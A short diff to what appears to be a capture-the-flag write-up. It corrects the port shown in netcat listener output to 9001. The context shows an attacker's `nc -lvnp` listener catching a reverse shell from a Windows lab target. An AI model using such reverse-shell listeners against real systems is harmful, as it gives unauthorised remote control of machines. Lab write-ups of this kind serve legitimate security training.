@@ -285,8 +285,8 @@ As seen above I named my newly added script as `command` and now I can send this
 ```
 root@kali:~# nc -lvnp 9001
 Ncat: Version 7.80 ( https://nmap.org/ncat )
-Ncat: Listening on :::443
-Ncat: Listening on 0.0.0.0:443
+Ncat: Listening on :::9001
+Ncat: Listening on 0.0.0.0:9001
 Ncat: Connection from 10.10.10.184.
 Ncat: Connection from 10.10.10.184:52351.
 Microsoft Windows [Version 10.0.18363.752]
